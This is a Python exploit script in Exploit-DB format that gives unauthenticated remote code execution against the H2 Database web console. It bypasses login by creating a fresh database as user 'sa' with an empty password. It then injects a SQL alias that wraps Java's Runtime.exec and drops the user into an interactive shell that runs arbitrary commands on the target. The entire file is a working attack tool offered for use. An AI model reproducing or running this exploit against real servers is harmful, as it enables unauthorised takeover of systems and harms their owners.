#!/usr/bin/env python

'''
Exploit Title: Unauthenticated RCE
Date: 2018/09/24
Exploit Author: h4ckNinja
Vendor: http://www.h2database.com/
Version: all versions
Tested on: Linux, Mac
Description: Building on the Alias RCE, there's an authentication bypass to create a database, and then login to that one.
Modified from: https://www.exploit-db.com/exploits/44422/
'''

import random
import string
import sys
import argparse
import html
import requests


def getSession(host):
	url = 'http://{}'.format(host)
	r = requests.get(url)
	path = r.text.split('href = ')[1].split(';')[0].replace("'","").replace('.jsp', '.do')

	return '{}/{}'.format(url, path)

def login(url, database):
	data = {
		'language': 'en',
		'setting': 'Generic H2 (Embedded)',
		'name': 'Generic H2 (Embedded)',
		'driver': 'org.h2.Driver',
		'url': database,
		'user': 'sa',
		'password': ''
	}

	print('[*] Attempting to create database')
	r = requests.post(url, data=data)

	if '<th class="login">Login</th>' in r.text:
		return False

	print('[+] Created database and logged in')

	return True

def prepare(url):
	cmd = '''CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;'''
	url = url.replace('login', 'query')

	print('[*] Sending stage 1')

	r = requests.post(url, data={'sql': cmd})

	if not 'NullPointerException' in r.text:
		print('[+] Shell succeeded - ^c or quit to exit')
		return url

	return False

def execve(url, cmd):
	r = requests.post(url, data={'sql':"CALL EXECVE('{}')".format(cmd)})

	try:
		execHTML = html.unescape(r.text.split('</th></tr><tr><td>')[1].split('</td>')[0].replace('<br />','\n').replace('&nbsp;',' ')).encode('utf-8').decode('utf-8','ignore')
		print(execHTML)

	except Exception as e:
		print('[-] Invalid command (' + str(e) + ')')


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	randString = ''.join(random.choices(string.ascii_letters + string.digits, k=5))

	parser.add_argument('-H',
			'--host',
			dest='host',
			metavar='127.0.0.1:8082',
			help='Specify a host',
			required=True)

	parser.add_argument('-d',
			'--database-url',
			dest='database',
			metavar='jdbc:h2:~/emptydb-' + randString,
			default='jdbc:h2:~/emptydb-' + randString,
			help='Database URL',
			required=False)

	args = parser.parse_args()

url = getSession(args.host)

if login(url, args.database):
	success = prepare(url)

	if success:
		while True:
			try:
				cmd = input('h2-shell$ ')

				if 'quit' not in cmd:
					execve(success, cmd)

				else:
					print('[+] Shutting down')
					sys.exit(0)

			except KeyboardInterrupt:
				print()
				print('[+] Shutting down')
				sys.exit(0)

	else:
		print('[-] Something went wrong injecting the payload.')

else:
	print('[-] Unable to login')
